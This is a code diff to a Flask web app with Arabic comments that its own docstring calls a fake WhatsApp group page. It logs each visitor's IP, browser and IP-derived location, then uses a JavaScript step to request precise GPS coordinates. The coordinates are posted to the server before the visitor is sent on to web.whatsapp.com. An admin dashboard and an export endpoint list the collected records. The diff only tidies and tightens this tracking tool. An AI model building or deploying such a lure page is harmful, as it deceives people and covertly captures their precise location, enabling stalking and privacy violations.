@@ -1,16 +1,15 @@
-from flask import Flask, request, jsonify, render_template, send_file
+from flask import Flask, request, jsonify, render_template
 import requests
 import json
 import time
 import os
 import datetime
-from threading import Thread
 import sqlite3
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your-secret-key-here'
+app.config['SECRET_KEY'] = 'your-secret-key-change-this'
 
-# قاعدة بيانات بسيطة
+# قاعدة البيانات
 def init_db():
     conn = sqlite3.connect('tracker.db')
     c = conn.cursor()
@@ -32,9 +31,11 @@ init_db()
 def get_location_info(ip):
     """الحصول على معلومات الموقع من IP"""
     try:
-        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
+        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
         if response.status_code == 200:
-            return response.json()
+            data = response.json()
+            if data.get('status') == 'success':
+                return data
     except:
         pass
     return {}
@@ -52,9 +53,10 @@ def log_to_db(data):
                   data.get('lon'), data.get('accuracy')))
         conn.commit()
         conn.close()
-        print(f"✅ تم حفظ بيانات: {data.get('ip')} - {data.get('city', 'Unknown')}")
+        return True
     except Exception as e:
-        print(f"❌ خطأ في حفظ البيانات: {e}")
+        print(f"Database error: {e}")
+        return False
 
 @app.route('/')
 def home():
@@ -63,7 +65,6 @@ def home():
 @app.route('/whatsapp-group')
 def fake_whatsapp_group():
     """صفحة مجموعة واتساب المزيفة"""
-    # جمع المعلومات الأساسية فوراً
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     basic_info = {
         'ip': visitor_ip,
@@ -71,9 +72,8 @@ def fake_whatsapp_group():
         'timestamp': datetime.datetime.now().isoformat()
     }
     
-    # الحصول على الموقع التقريبي
     location_info = get_location_info(visitor_ip)
-    if location_info and location_info.get('status') == 'success':
+    if location_info:
         basic_info.update({
             'country': location_info.get('country'),
             'city': location_info.get('city'),
@@ -82,7 +82,6 @@ def fake_whatsapp_group():
         })
     
     log_to_db(basic_info)
-    
     return render_template('whatsapp_group.html')
 
 @app.route('/join-group')
@@ -129,34 +128,28 @@ def request_location():
         <p>يرجى الانتظار</p>
         
         <script>
-            // طلب الموقع بعد ثانيتين
             setTimeout(() => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
-                            // إرسال الإحداثيات الدقيقة
                             fetch('/capture-location', {
                                 method: 'POST',
                                 headers: {'Content-Type': 'application/json'},
                                 body: JSON.stringify({
                                     lat: position.coords.latitude,
                                     lon: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    ip: '{{ request.remote_addr }}'
+                                    accuracy: position.coords.accuracy
                                 })
                             }).then(() => {
-                                // التوجيه إلى واتساب
                                 window.location.href = 'https://web.whatsapp.com';
                             });
                         },
                         function(error) {
-                            // إذا رفض المستخدم
-                            console.log('تم رفض طلب الموقع');
                             window.location.href = 'https://web.whatsapp.com';
                         },
                         {
                             enableHighAccuracy: true,
-                            timeout: 15000,
+                            timeout: 10000,
                             maximumAge: 0
                         }
                     );
@@ -174,29 +167,27 @@ def capture_location():
     """استقبال الإحداثيات الدقيقة"""
     try:
         gps_data = request.json
-        print(f"📍 تم الحصول على الإحداثيات: {gps_data}")
+        print(f"GPS Coordinates: {gps_data}")
         
-        # تحديث البيانات في قاعدة البيانات
         conn = sqlite3.connect('tracker.db')
         c = conn.cursor()
         c.execute('''UPDATE logs SET lat = ?, lon = ?, accuracy = ?
-                     WHERE ip = ? ORDER BY id DESC LIMIT 1''',
-                 (gps_data.get('lat'), gps_data.get('lon'), 
-                  gps_data.get('accuracy'), request.remote_addr))
+                     WHERE id = (SELECT MAX(id) FROM logs)''',
+                 (gps_data.get('lat'), gps_data.get('lon'), gps_data.get('accuracy')))
         conn.commit()
         conn.close()
         
-        return jsonify({'status': 'success', 'message': 'تم حفظ الموقع'})
+        return jsonify({'status': 'success'})
     except Exception as e:
-        print(f"❌ خطأ في حفظ الموقع: {e}")
-        return jsonify({'status': 'error', 'message': str(e)})
+        print(f"Error: {e}")
+        return jsonify({'status': 'error'})
 
 @app.route('/admin')
 def admin_dashboard():
     """لوحة التحكم"""
     conn = sqlite3.connect('tracker.db')
     c = conn.cursor()
-    c.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 100')
+    c.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 50')
     logs = c.fetchall()
     conn.close()
     
@@ -212,15 +203,9 @@ def export_logs():
     conn.close()
     
     return jsonify([{
-        'id': log[0],
-        'ip': log[1],
-        'user_agent': log[2],
-        'timestamp': log[3],
-        'country': log[4],
-        'city': log[5],
-        'lat': log[6],
-        'lon': log[7],
-        'accuracy': log[8]
+        'id': log[0], 'ip': log[1], 'user_agent': log[2],
+        'timestamp': log[3], 'country': log[4], 'city': log[5],
+        'lat': log[6], 'lon': log[7], 'accuracy': log[8]
     } for log in logs])
 
 @app.route('/delete-logs', methods=['POST'])
@@ -232,7 +217,7 @@ def delete_logs():
         c.execute('DELETE FROM logs')
         conn.commit()
         conn.close()
-        return jsonify({'status': 'success', 'message': 'تم حذف جميع السجلات'})
+        return jsonify({'status': 'success'})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
 
